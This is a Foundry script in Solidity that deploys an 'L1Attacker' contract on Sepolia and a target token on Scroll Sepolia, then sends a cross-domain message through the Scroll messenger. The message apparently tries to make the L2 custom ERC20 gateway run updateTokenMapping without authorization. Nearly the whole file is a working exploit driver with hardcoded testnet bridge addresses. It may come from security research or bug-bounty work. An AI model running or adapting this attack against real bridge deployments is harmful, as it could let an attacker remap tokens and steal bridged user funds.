// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console} from "forge-std/Script.sol";
import {Vm} from "forge-std/Vm.sol";
import {L1Attacker} from "../src/L1Attacker.sol";
import {TargetL2Token} from "../src/TargetL2Token.sol";

contract DeployAndAttack is Script {
    // Sepolia Testnet Addresses
    address constant L1_SCROLL_MESSENGER = 0x50c7d3e7f7c656493D1D76aaa1a836CedfCBB16A;
    address constant L2_SCROLL_MESSENGER = 0xBa50f5340FB9F3Bd074bD638c9BE13eCB36E603d; // L1's counterpart on L2
    address constant L2_CUSTOM_ERC20_GATEWAY = 0x058dec71E53079F9ED053F3a0bBca877F6f3eAcf;
    address constant L1_CUSTOM_ERC20_GATEWAY_COUNTERPART = 0x31C994F2017E71b82fd4D8118F140c81215bbb37;

    // Fee for L1ScrollMessenger.sendMessage. Adjust if necessary.
    // This value can be obtained by calling L1ScrollMessenger.estimateCrossDomainMessageFee(uint256 _gasLimit)
    // For a gasLimit of 200000, as of late 2023/early 2024, it was around 0.0002 - 0.0004 ETH on Sepolia.
    // Using a slightly higher value for safety.
    uint256 constant MESSAGING_FEE = 0.001 ether; 

    L1Attacker l1Attacker;
    TargetL2Token targetL2Token;

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address deployerAddress = vm.addr(deployerPrivateKey);
        console.log("Using Deployer Address:", deployerAddress);

        // 1. Deploy TargetL2Token on L2 Scroll Sepolia
        selectRpcEndpoint("scrollSepolia");
        vm.startBroadcast(deployerPrivateKey);
        targetL2Token = new TargetL2Token("TestL2TokenP", "TLT2P", 1000 * 1e18); // Changed name slightly for uniqueness
        console.log("TargetL2Token deployed on L2 Scroll Sepolia at:", address(targetL2Token));
        vm.stopBroadcast();

        // 2. Deploy L1Attacker on L1 Sepolia
        selectRpcEndpoint("sepolia");
        vm.startBroadcast(deployerPrivateKey);
        l1Attacker = new L1Attacker();
        console.log("L1Attacker deployed on L1 Sepolia at:", address(l1Attacker));
        vm.stopBroadcast();

        // 3. Call initiateAttack on L1Attacker (on L1 Sepolia)
        // Ensure the RPC endpoint is still set to Sepolia for this L1 transaction
        selectRpcEndpoint("sepolia"); 
        vm.startBroadcast(deployerPrivateKey);
        
        console.log("Calling initiateAttack on L1Attacker with parameters:");
        console.log("  _l1ScrollMessengerAddress:", L1_SCROLL_MESSENGER);
        console.log("  _l2ScrollMessengerAddress:", L2_SCROLL_MESSENGER);
        console.log("  _targetL2GatewayAddress:", L2_CUSTOM_ERC20_GATEWAY);
        console.log("  _l2TokenAddress:", address(targetL2Token));
        console.log("  _l1CounterpartGatewayAddress:", L1_CUSTOM_ERC20_GATEWAY_COUNTERPART);
        console.log("  Messaging Fee (msg.value):", MESSAGING_FEE);

        l1Attacker.initiateAttack{value: MESSAGING_FEE}(
            L1_SCROLL_MESSENGER,
            L2_SCROLL_MESSENGER,
            L2_CUSTOM_ERC20_GATEWAY,
            address(targetL2Token), // This is the address of the token deployed on L2
            L1_CUSTOM_ERC20_GATEWAY_COUNTERPART
        );
        console.log("initiateAttack transaction sent from L1 Sepolia.");
        // The transaction hash will be printed by `forge script` itself.
        vm.stopBroadcast();

        console.log("Script finished.");
        console.log("Monitor L1 Sepolia for the L1Attacker.initiateAttack transaction.");
        console.log("Then, monitor Scroll Sepolia Testnet Explorer (Scrollscan) for the relayed message on L2.");
        console.log("Look for a transaction to L2_SCROLL_MESSENGER (%s)", L2_SCROLL_MESSENGER);
        console.log("  which then calls L2_CUSTOM_ERC20_GATEWAY (%s)", L2_CUSTOM_ERC20_GATEWAY);
        console.log("  and check if updateTokenMapping was called with TargetL2Token (%s) and L1_CUSTOM_ERC20_GATEWAY_COUNTERPART (%s)", address(targetL2Token), L1_CUSTOM_ERC20_GATEWAY_COUNTERPART);
    }

    function selectRpcEndpoint(string memory networkName) internal {
        console.log("Attempting to select RPC endpoint for network:", networkName);
        string memory rpcUrl = vm.rpcUrl(networkName);
        if (bytes(rpcUrl).length == 0) {
            revert(string.concat("RPC URL for '", networkName, "' not found. Ensure it's set in foundry.toml (e.g., scrollSepolia_rpc_url) or as an environment variable (e.g., SCROLLSEPOLIA_RPC_URL)."));
        }
        console.log("Selected RPC Endpoint for %s: %s", networkName, rpcUrl);
        uint256 forkId = vm.createSelectFork(rpcUrl);
        console.log("Fork ID for %s: %s", networkName, forkId);
    }
}
